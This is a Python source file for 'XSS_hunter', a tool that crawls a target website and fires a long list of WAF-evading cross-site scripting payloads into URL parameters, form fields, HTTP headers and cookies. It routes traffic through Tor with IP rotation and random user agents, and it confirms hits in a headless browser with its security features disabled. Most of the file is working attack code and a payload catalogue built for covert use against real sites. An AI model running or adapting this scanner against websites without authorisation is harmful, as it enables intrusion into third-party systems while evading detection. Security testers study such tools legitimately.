#!/usr/bin/env python3

def display_banner():
    banner =    "=============================================="
    banner += "\n             Welcome to XSS_hunter            "
    banner += "\n     A Powerful Tool for Security Research    "
    banner += "\n                   Developed by the-shadow-0  "
    banner += "\n=============================================="
    print(banner)

import argparse
import requests
import re
import random
import time
import os
import json
import html
import base64
import logging
import hashlib
from urllib.parse import urlparse, urljoin, parse_qs, quote_plus, unquote
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from stem import Signal
from stem.control import Controller
from datetime import datetime

TOR_PROXY = "socks5://127.0.0.1:9050"
REQUEST_DELAY = 1
MAX_REDIRECTS = 3
TIMEOUT = 15
REPORT_DIR = "xss_reports"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

DESKTOP_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:115.0) Gecko/20100101 Firefox/115.0"
]

class XSSHunter:
    def __init__(self, url, use_tor=False, headless=True, depth=2, report_dir=REPORT_DIR):
        self.ua_list = DESKTOP_USER_AGENTS
        parsed_input = urlparse(url)
        if not parsed_input.scheme:
            url = 'http://' + url
        self.target_url = url
        self.base_url = self.get_base_url(self.target_url)
        self.session = self.create_session(use_tor)
        self.visited_urls = set()
        self.crawl_queue = []
        self.vulnerabilities = []
        self.headless = headless
        self.crawl_depth = depth
        self.driver = None
        self.report_dir = report_dir
        self.use_tor = use_tor
        os.makedirs(self.report_dir, exist_ok=True)
        self.report_file = os.path.join(
            self.report_dir,
            f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )
        self.payload_counter = 0

    def get_random_ua(self):
        """Select a random desktop-only user agent."""
        return random.choice(self.ua_list)
    
    def get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def create_session(self, use_tor):
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.get_random_ua()
        })
        
        if use_tor:
            session.proxies = {'http': TOR_PROXY, 'https': TOR_PROXY}
            self.rotate_tor_ip()
            session.headers['User-Agent'] = self.get_random_ua()            
        return session

    def rotate_tor_ip(self):
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                logger.info("[*] Tor IP rotated successfully")
        except Exception as e:
            logger.error(f"[!] Tor IP rotation failed: {e}")

    def get_links(self, soup, current_url):
        links = set()
        for tag in soup.find_all(['a', 'link', 'area']):
            href = tag.get('href', '').strip()
            if self.is_valid_link(href):
                absolute_url = urljoin(current_url, href)
                if self.is_same_domain(absolute_url):
                    links.add(absolute_url)
        return links

    def get_forms(self, soup):
        return soup.find_all('form')

    def is_valid_link(self, href):
        return href and not href.startswith(('javascript:', 'mailto:', 'tel:', '#', 'data:'))

    def is_same_domain(self, url):
        return urlparse(url).netloc == urlparse(self.base_url).netloc

    def crawl(self, url, depth=0):
        if depth > self.crawl_depth or url in self.visited_urls:
            return
            
        self.visited_urls.add(url)
        logger.info(f"[*] Crawling: {url}")
        
        try:
            self.session.headers['User-Agent'] = self.get_random_ua()
            response = self.session.get(url, timeout=TIMEOUT)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Process links
            for link in self.get_links(soup, url):
                self.crawl_queue.append((link, depth + 1))
            
            # Process forms
            for form in self.get_forms(soup):
                self.test_form(form, url)
            
            # Test URL parameters
            self.test_url_parameters(url)
            
            # Test headers and cookies
            self.test_headers(url, response.headers)
            self.test_cookies(response.cookies)
            
            time.sleep(REQUEST_DELAY)
            
        except Exception as e:
            logger.error(f"[!] Crawling error: {e}")
        
        # Process queued URLs
        while self.crawl_queue:
            next_url, next_depth = self.crawl_queue.pop(0)
            self.crawl(next_url, next_depth)

    def test_url_parameters(self, url):
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        if not query_params:
            return
            
        logger.info(f"[*] Testing URL parameters: {url}")
        
        for param in query_params:
            payloads = self.generate_evasive_payloads(param)
            for payload in payloads:
                modified_params = query_params.copy()
                modified_params[param] = [payload]
                test_url = self.build_url(parsed, modified_params)
                context = self.test_xss(test_url, payload, "GET")
                if context:
                    self.record_vulnerability(
                        url=test_url,
                        param=param,
                        payload=payload,
                        method="GET",
                        context=context,
                        location="URL parameter"
                    )

    def test_headers(self, url, headers):
        logger.info(f"[*] Testing headers for: {url}")
        payloads = self.generate_evasive_payloads("header")
        
        for header_name in ['User-Agent', 'Referer', 'X-Forwarded-For']:
            for payload in payloads:
                try:
                    self.session.headers[header_name] = payload
                    response = self.session.get(url, timeout=TIMEOUT)
                    context = self.detect_xss(response.text, payload)
                    if context:
                        self.record_vulnerability(
                            url=url,
                            param=header_name,
                            payload=payload,
                            method="HEADER",
                            context=context,
                            location="HTTP header"
                        )
                except Exception as e:
                    logger.error(f"[!] Header test error: {e}")

    def test_cookies(self, cookies):
        logger.info(f"[*] Testing cookies")
        payloads = self.generate_evasive_payloads("cookie")
        
        for cookie_name in cookies:
            for payload in payloads:
                try:
                    self.session.cookies.set(cookie_name, payload)
                    response = self.session.get(self.target_url, timeout=TIMEOUT)
                    context = self.detect_xss(response.text, payload)
                    if context:
                        self.record_vulnerability(
                            url=self.target_url,
                            param=cookie_name,
                            payload=payload,
                            method="COOKIE",
                            context=context,
                            location="Cookie value"
                        )
                except Exception as e:
                    logger.error(f"[!] Cookie test error: {e}")

    def test_form(self, form, current_url):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all(['input', 'textarea', 'select'])
        form_data = {}
        enctype = form.get('enctype', 'application/x-www-form-urlencoded')
        
        # Resolve relative form action
        if not action:
            action = current_url
        else:
            action = urljoin(current_url, action)
        
        # Skip if action is not valid
        if not action or not action.startswith(('http://', 'https://')):
            logger.warning(f"[!] Skipping form with invalid action: {action}")
            return
            
        logger.info(f"[*] Testing form at: {action}")
        
        for input_tag in inputs:
            name = input_tag.get('name')
            if name and name.strip():
                form_data[name] = input_tag.get('value', '') or self.generate_dummy_value(input_tag)
        
        if not form_data:
            logger.info("[!] Form has no parameters to test")
            return
            
        for param in form_data:
            payloads = self.generate_evasive_payloads(param)
            for payload in payloads:
                test_data = form_data.copy()
                test_data[param] = payload
                
                try:
                    if method == 'post':
                        if enctype == 'multipart/form-data':
                            # Handle file uploads with multipart encoding
                            files = {}
                            for key, value in test_data.items():
                                files[key] = (None, value)
                            response = self.session.post(action, files=files)
                        else:
                            response = self.session.post(action, data=test_data)
                            
                        context = self.detect_xss(response.text, payload)
                        if context:
                            self.record_vulnerability(
                                url=action,
                                param=param,
                                payload=payload,
                                method="POST",
                                context=context,
                                location="Form field"
                            )
                    else:
                        # Build GET URL with parameters
                        parsed = urlparse(action)
                        query = parse_qs(parsed.query)
                        query.update({k: [v] for k, v in test_data.items()})
                        test_url = self.build_url(parsed, query)
                        context = self.test_xss(test_url, payload, "GET")
                        if context:
                            self.record_vulnerability(
                                url=test_url,
                                param=param,
                                payload=payload,
                                method="GET",
                                context=context,
                                location="Form field"
                            )
                except Exception as e:
                    logger.error(f"[!] Form test error: {e}")

    def generate_dummy_value(self, tag):
        if tag.name == 'input':
            input_type = tag.get('type', 'text')
            if input_type == 'email':
                return "test@example.com"
            elif input_type == 'number':
                return "123"
            elif input_type == 'date':
                return "2023-01-01"
        elif tag.name == 'textarea':
            return "test comment"
        return "test"

    def build_url(self, parsed_url, params):
        query = '&'.join([f"{k}={quote_plus(v[0])}" for k,v in params.items()])
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"

    def generate_evasive_payloads(self, param_name):
        """Generate advanced WAF-evading XSS payloads"""
        self.payload_counter += 1
        rand_num = random.randint(1000, 9999)
        param_hash = hashlib.sha1(param_name.encode()).hexdigest()[:8]
        hex_value = f"{rand_num:04x}"
        base64_value = base64.b64encode(f"alert({rand_num})".encode()).decode()
        
        # Advanced evasion techniques
        payloads = [
            # Basic evasion
            f'<svg/onload=alert`{rand_num}`>',
            
            # Case variation with null bytes
            f'<scRIpt\u0000>alert({rand_num})</scrIpt>',
            
            # Multi-layer encoding
            f'%253Cscript%253Ealert%2528{rand_num}%2529%253C%252Fscript%253E',
            
            # JavaScript pseudo-protocol with broken syntax
            f'javascript:alert/*{rand_num}*/`{param_hash}`//',
            
            # Event handler obfuscation with invalid attributes
            f'<img src=x oNeRrOr=alert`{rand_num}` bad=">',
            
            # Uncommon tags with special characters
            f'<details/open/ontoggle=alert({rand_num})>',
            
            # SVG vector with namespace confusion
            f'<svg xmlns="http://www.w3.org/2000/svg"><script>alert`{rand_num}`',
            
            # Unclosed tags with broken HTML
            f'<script src=//{rand_num}.rs {param_name}=alert`{rand_num}`',
            
            # HTML5 entities with multi-byte characters
            f'&Tab;javascript:alert(&Tab;{rand_num}&Tab;)',
            
            # DOM-based vectors with indirect execution
            f'<script>setTimeout`alert\\x28{rand_num}\\x29`</script>',
            
            # UTF-8 BOM to break WAF regex
            f'\xEF\xBB\xBF<svg onload=alert({rand_num})>',
            
            # Template literal obfuscation (fixed)
            f'<script>alert`${{String.fromCharCode(0x{hex_value})}}`</script>',
            
            # CSS expression vectors
            f'<div style="background:url(javascript:alert`{rand_num}`)">',
            
            # Backtick nesting for WAF confusion
            f'<script>window[`al`+`ert`]({rand_num})</script>',
            
            # Double encoding with HTML entities
            f'&lt;script&gt;alert({rand_num})&lt;/script&gt;',
            
            # JavaScript URL scheme with base64
            f'javascript:eval(atob("{base64_value}"))',
            
            # Broken protocol handler
            f'jav&#x09;ascript:alert({rand_num})',
            
            # React JSX syntax evasion
            f'<img src=x onError=alert`{rand_num}` />',
            
            # AngularJS sandbox escape
            f'{{{{constructor.constructor("alert({rand_num})")()}}}}',
            
            # UTF-7 encoding
            f'+ADw-script+AD4-alert({rand_num})+ADw-/script+AD4-',
            
            # HTML comment obfuscation
            f'<!--><script>/* */alert({rand_num})</script>',
            
            # SVG foreignObject
            f'<svg><foreignObject><script>alert({rand_num});</script></foreignObject></svg>',
            
            # Mutation XSS vectors
            f'<xss id=x onfocus=alert({rand_num}) tabindex=1>#x',
            
            # ECMAScript 6 arrow functions
            f'<script>window.onload=()=>alert({rand_num})</script>',
            
            # Data URL scheme
            f'data:text/html;base64,PHNjcmlwdD5hbGVydCh7cmFuZF9udW19KTwvc2NyaXB0Pg=='.replace(
                "{rand_num}", str(rand_num)
            ),
            
            # JavaScript template with unicode escape
            f'<script>\\u0061lert({rand_num})</script>',
            
            # HTML entity encoding in tags
            f'<&#x73;cript>alert({rand_num})</&#x73;cript>',
            
            # CSS @import with JavaScript
            f'<style>@import "javascript:alert({rand_num})";</style>',
            
            # Iframe source with JavaScript
            f'<iframe src=javascript:alert({rand_num})></iframe>',
            
            # MathML vector
            f'<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert({rand_num})">CLICK</maction></math>',
            
            # Object tag vector
            f'<object data="javascript:alert({rand_num})"></object>',
            
            # Embed tag vector
            f'<embed src="javascript:alert({rand_num})">',
            
            # Expression-based CSS
            f'<div style="width: expression(alert({rand_num}))">',
            
            # CSS animation payload
            f'<style>@keyframes x{{}}@supports(animation: x){{}}@media {{}}[style*="animation-name: x"]{{background:url("javascript:alert({rand_num})")}}</style>',
            
            # VBScript vector (for IE)
            f'<script language="VBScript">MsgBox "{rand_num}"</script>',
            
            # HTML5 formaction attribute
            f'<form><button formaction="javascript:alert({rand_num})">X</button></form>',
            
            # HTML5 poster attribute
            f'<video poster=javascript:alert({rand_num})>'
        ]
        return payloads

    def test_xss(self, url, payload, method):
        try:
            self.session.headers['User-Agent'] = self.get_random_ua()
            response = self.session.get(url, timeout=TIMEOUT)
            context = self.detect_xss(response.text, payload)
            if context:
                return self.verify_with_selenium(url, payload, method)
            return None
        except Exception as e:
            logger.error(f"[!] Testing error: {e}")
            return None

    def detect_xss(self, content, payload):
        """Multi-layered detection approach"""
        # Check for reflection in different contexts
        decoded_content = html.unescape(content)
        
        reflection_contexts = [
            ("HTML Tag", rf"<[^>]*?{re.escape(payload)}"),
            ("Attribute", rf"=[\s]*['\"]?{re.escape(payload)}"),
            ("JavaScript", rf"\(.*?{re.escape(payload)}.*?\)"),
            ("Comment", rf"<!--.*?{re.escape(payload)}.*?-->"),
            ("Script Tag", rf"<script[^>]*>.*?{re.escape(payload)}.*?</script>")
        ]
        
        for context_type, pattern in reflection_contexts:
            if re.search(pattern, decoded_content, re.IGNORECASE | re.DOTALL):
                return context_type
        return None

    def init_selenium(self):
        if not self.driver:
            options = Options()
            if self.headless:
                options.add_argument("--headless")
            options.add_argument("--disable-gpu")
            options.add_argument("--disable-extensions")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-infobars")
            options.add_argument("--disable-notifications")
            options.add_argument("--ignore-certificate-errors")
            options.add_argument("--disable-web-security")
            options.add_argument("--js-flags=--expose-gc")
            options.add_argument("--disable-xss-auditor")
            self.driver = webdriver.Chrome(options=options)

    def verify_with_selenium(self, url, payload, method):
        """Execute payload in headless browser for confirmation"""
        try:
            self.init_selenium()
            
            # Prepare test page
            test_page = f"""
            <html>
            <head>
                <title>XSS Verification</title>
            </head>
            <body>
                <iframe id="testframe" src="{url}" style="width:100%; height:500px;"></iframe>
                <script>
                    var start = Date.now();
                    var checkInterval = setInterval(function() {{
                        try {{
                            var frame = document.getElementById('testframe');
                            var doc = frame.contentDocument || frame.contentWindow.document;
                            
                            // Check for reflection
                            if (doc.documentElement.innerHTML.includes('{payload}')) {{
                                alert('XSS Reflection Verified');
                                clearInterval(checkInterval);
                            }}
                            
                            // Timeout after 10 seconds
                            if (Date.now() - start > 10000) {{
                                clearInterval(checkInterval);
                            }}
                        }} catch(e) {{ 
                            // Cross-origin errors expected
                        }}
                    }}, 500);
                </script>
            </body>
            </html>
            """
            
            with open("testpage.html", "w") as f:
                f.write(test_page)
                
            self.driver.get(f"file://{os.path.abspath('testpage.html')}")
            
            # Wait for potential alerts
            try:
                # Check for reflection verification alert
                WebDriverWait(self.driver, 10).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                
                if "XSS Reflection Verified" in alert_text:
                    logger.info(f"[!] Confirmed XSS reflection with payload: {payload}")
                    return True
            except:
                pass
                
            try:
                # Check for execution alert
                WebDriverWait(self.driver, 10).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                logger.info(f"[!] Confirmed XSS execution with payload: {payload}")
                return True
            except:
                return False
        except Exception as e:
            logger.error(f"[!] Selenium verification error: {e}")
            return False
        finally:
            try:
                os.remove("testpage.html")
            except:
                pass

    def record_vulnerability(self, url, param, payload, method, context, location):
        """Record vulnerability with all details"""
        vuln = {
            "type": "XSS",
            "url": url,
            "parameter": param,
            "payload": payload,
            "method": method,
            "context": context,
            "location": location,
            "timestamp": datetime.now().isoformat(),
            "verified": True,
            "reproduction_steps": self.generate_reproduction_steps(method, url, param, payload)
        }
        
        self.vulnerabilities.append(vuln)
        logger.info(f"\n[+] XSS FOUND: {url}")
        logger.info(f"    Parameter: {param} ({location})")
        logger.info(f"    Payload: {payload}")
        logger.info(f"    Context: {context}")
        
        # Save immediately after discovery
        self.save_report()

    def generate_reproduction_steps(self, method, url, param, payload):
        """Generate detailed reproduction steps"""
        if method == "GET":
            return [
                f"1. Open browser to: {url}",
                f"2. Locate parameter '{param}' in URL query string",
                f"3. Replace value with: {payload}",
                f"4. Submit request and observe XSS execution"
            ]
        elif method == "POST":
            return [
                f"1. Open browser developer tools (F12)",
                f"2. Navigate to: {url}",
                f"3. Locate form with parameter '{param}'",
                f"4. Change value to: {payload}",
                f"5. Submit form and observe XSS execution"
            ]
        elif method == "HEADER":
            return [
                f"1. Use a HTTP client (curl, Postman, etc.)",
                f"2. Set URL: {url}",
                f"3. Set header '{param}' to: {payload}",
                f"4. Send request and check response for XSS"
            ]
        elif method == "COOKIE":
            return [
                f"1. Open browser developer tools (F12)",
                f"2. Navigate to: {url}",
                f"3. Set cookie '{param}' to: {payload}",
                f"4. Refresh page and observe XSS execution"
            ]
        return ["Manual reproduction required based on context"]

    def save_report(self):
        """Save vulnerabilities to JSON report"""
        report = {
            "target": self.target_url,
            "start_time": datetime.now().isoformat(),
            "config": {
                "tor": self.use_tor,
                "crawl_depth": self.crawl_depth
            },
            "vulnerabilities": self.vulnerabilities
        }
        
        with open(self.report_file, 'w') as f:
            json.dump(report, f, indent=2)

    def run(self):
        logger.info(f"[*] Starting scan: {self.target_url}")
        logger.info(f"[*] Report file: {self.report_file}")
        self.crawl(self.target_url)
        self.final_report()
        if self.driver:
            self.driver.quit()

    def final_report(self):
        logger.info("\n[+] Scan Complete")
        logger.info(f"[*] Total URLs Crawled: {len(self.visited_urls)}")
        logger.info(f"[*] Vulnerabilities Found: {len(self.vulnerabilities)}")
        logger.info(f"[*] Report saved to: {self.report_file}")
        
        # Print summary
        if self.vulnerabilities:
            logger.info("\n[VULNERABILITY SUMMARY]")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                logger.info(f"{i}. {vuln['url']}")
                logger.info(f"   - Parameter: {vuln['parameter']} ({vuln['location']})")
                logger.info(f"   - Payload: {vuln['payload']}")
                logger.info(f"   - Context: {vuln['context']}")
                logger.info(f"   - Method: {vuln['method']}\n")

if __name__ == "__main__":
    display_banner()
    parser = argparse.ArgumentParser(description="Advanced XSS Hunter")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--tor", action="store_true", help="Use Tor network")
    parser.add_argument("--visible", action="store_true", help="Run browser in visible mode")
    parser.add_argument("--depth", type=int, default=2, help="Crawling depth (default: 2)")
    parser.add_argument("--output", default=REPORT_DIR, help="Output directory for reports")
    args = parser.parse_args()

    scanner = XSSHunter(
        url=args.url,
        use_tor=args.tor,
        headless=not args.visible,
        depth=args.depth,
        report_dir=args.output
    )
    scanner.run()
